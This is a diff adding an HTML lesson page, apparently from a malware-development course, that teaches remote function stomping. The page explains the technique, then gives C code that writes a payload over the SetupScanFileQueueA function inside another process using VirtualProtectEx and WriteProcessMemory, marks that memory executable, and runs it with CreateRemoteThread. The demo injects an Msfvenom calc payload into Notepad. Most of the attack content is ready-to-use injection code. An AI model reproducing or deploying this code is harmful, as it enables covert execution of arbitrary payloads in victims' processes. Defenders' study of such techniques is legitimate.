@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Remote Function Stomping Injection</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="remote-function-stomping-injection" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="code-xml" class="w-4 h-4 sm:w-5 sm:h-5 text-[#43d17a] flex-shrink-0"></i>
+                <span>Remote Function Stomping Injection</span>
+            </h2>
+            <a href="#remote-function-stomping-injection" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The previous module introduced function stomping on the local address space of the process. In this module, the same implementation logic will be used to inject code into a remote process.</p><h3 id="remote-function-stomping" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Remote Function Stomping</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The DLLs that implement Windows API functions are shared across all processes that use them, therefore, the functions within the DLL have the same address in each process. However, the address of the DLL itself will differ between processes due to the different virtual address spaces. This means that while the address of the target function remains constant across different processes, the DLL which exports these functions may not be the same.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For example, two processes, A and B, will be sharing <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Kernel32.dll</code> but the address of the DLL may be different within each process due to <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Address Space Layout Randomization</a>. However, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualAlloc</code>, which is exported from <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Kernel32.dll</code>, will have the same address in both processes.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">It is important to note that in order for function stomping to be performed remotely, the DLL that exports the targeted function must already be loaded into the target process. For example, to target the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetupScanFileQueueA</code> function in a remote function, which is exported from <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Setupapi.dll</code>, that DLL must already be loaded into the target process. If the remote process does not have <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Setupapi.dll</code> loaded, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetupScanFileQueueA</code> function will not be present in the target process, resulting in an attempt to write to an address that does not exist.</p><h3 id="remote-function-stomping-code" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Remote Function Stomping Code</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following code is similar to the local function stomping code, however, it uses different WinAPI functions to carry out code injection.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define		SACRIFICIAL_DLL            &quot;setupapi.dll&quot;#define		SACRIFICIAL_FUNC           &quot;SetupScanFileQueueA&quot;// ...
+
+BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
+
+	DWORD	dwOldProtection            = NULL;
+	SIZE_T	sNumberOfBytesWritten      = NULL;
+
+	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &amp;dwOldProtection)) {
+		printf(&quot;[!] VirtualProtectEx [RW] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten){
+		printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+		printf(&quot;[!] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
+		return FALSE;
+	}
+
+	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
+		printf(&quot;[!] VirtualProtectEx [RWX] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+
+int wmain(int argc, wchar_t* argv[]) {
+
+	HANDLE		hProcess		= NULL,
+		        hThread			= NULL;
+	PVOID		pAddress		= NULL;
+	DWORD		dwProcessId		= NULL;
+
+	HMODULE		hModule			= NULL;
+
+	if (argc &lt; 2) {
+		wprintf(L&quot;[!] Usage : \&quot;%s\&quot; &lt;Process Name&gt; \n&quot;, argv[0]);
+		return -1;
+	}
+
+	wprintf(L&quot;[i] Searching For Process Id Of \&quot;%s\&quot; ... &quot;, argv[1]);
+	if (!GetRemoteProcessHandle(argv[1], &amp;dwProcessId, &amp;hProcess)) {
+		printf(&quot;[!] Process is Not Found \n&quot;);
+		return -1;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;[i] Found Target Process Pid: %d \n&quot;, dwProcessId);
+
+
+
+	printf(&quot;[i] Loading \&quot;%s\&quot;... &quot;, SACRIFICIAL_DLL);
+	hModule = LoadLibraryA(SACRIFICIAL_DLL);
+	if (hModule == NULL) {
+		printf(&quot;[!] LoadLibraryA Failed With Error : %d \n&quot;, GetLastError());
+		return -1;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+
+
+	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
+	if (pAddress == NULL) {
+		printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
+		return -1;
+	}
+	printf(&quot;[+] Address Of \&quot;%s\&quot; : 0x%p \n&quot;, SACRIFICIAL_FUNC, pAddress);
+
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
+	getchar();
+	printf(&quot;[i] Writing ... &quot;);
+	if (!WritePayload(hProcess, pAddress, Payload, sizeof(Payload))) {
+		return -1;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+
+
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
+	if (hThread != NULL)
+		WaitForSingleObject(hThread, INFINITE);
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
+	getchar();
+
+	return 0;
+}</code></pre>
+        </div><h3 id="demo" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Targeting <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Notepad.exe</code> process.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/remote-stomp-109445015-30dbf6a1-2ece-4d4c-a304-a9fc12f8f231.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Retrieving <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetupScanFileQueueA</code>&#x27;s address.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/remote-stomp-209445031-a0b9b825-93f8-429c-a6eb-5dc4e276e2df.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The original bytes of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetupScanFileQueueA</code> function.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/remote-stomp-309445021-d9ccc1af-1eb5-4e9e-ba62-8f67b3442c90.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Replacing the function&#x27;s bytes with the Msfvenom calc payload.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/remote-stomp-409445036-d03ad29c-8eb0-4b5a-b166-bd30458dbe1a.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Running the payload.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/remote-stomp-509445038-6bb55397-dbac-4546-b1d7-2a7be0744c8a.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div></main></body></html>
